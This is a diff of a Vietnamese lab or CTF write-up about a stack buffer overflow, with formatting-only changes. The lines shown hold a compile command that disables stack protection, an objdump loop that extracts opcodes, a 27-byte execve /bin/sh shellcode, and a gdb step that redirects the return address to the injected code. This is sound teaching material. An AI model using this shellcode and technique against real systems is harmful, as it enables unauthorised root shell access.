@@ -110,10 +110,10 @@ Stack của hàm main()\
     Dấu # sẽ hiện ra nghĩa là đang thực thi shell ở quyền root thay vì $ của user  
     Thoát bằng lệnh exit    
  1.  Biên dịch chương trình đối tượng ctf.c thành ctg.out với tắt các cơ chế bảo vệ để có thể tấn công:  
-`gcc -g ctf.c -o ctf.out -fno-stack-protector -mpreferred-stack-boundary=2 -z execstack`   
+`gcc -g ctf.c -o ctf.out -fno-stack-protector -mpreferred-stack-boundary=2 -z execstack`
  1.  Rã chương trình sh thành opcode  
-`for i in $(objdump -d sh | grep "^ " | cut -f2); do echo -n '\x'$i; done; echo`
-    Kết quả cho ra:
+`for i in $(objdump -d sh | grep "^ " | cut -f2); do echo -n '\x'$i; done; echo`\
+    Kết quả cho ra:\
 `\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\x31\xc0\xb0\x0b\xcd\x80  `\
     size: 27 bytes  
 Debug chương trình ctf.out  
@@ -136,5 +136,5 @@ Chương trình sh đã được chèn thành công vào trong buf[100] của ch
 Chúng ta cần thay đổi địa chỉ của 'ra' thành địa chỉ của esp là địa chỉ xuất phát của chương trình được tiêm vào.\
 `set *0xffffd6e0 = $esp`\
 ![](https://lh7-rt.googleusercontent.com/docsz/AD_4nXfGOnFEzJ_1UQhRK4IywOlc59rBKJbLnrcqXipIsoAiBdUP2XlVqtWruwgJsHRWmzlB9p6LBBhIuh-qPR6JJY2YnZ6uLhCXIssncTiyR8gDYA0qBCAXeVVuebCc2za7lb3G9TkmsuOLSlWeh0cXSB3mc-kA?key=x066aHYoH5XtbJjV6Ng-LQ)\
-*Giải thích: vì sao lại là 0xffffd6e0*
+*Giải thích: vì sao lại là 0xffffd6e0*\
 *Vì tại địa chỉ bắt đầu của 'ra'*
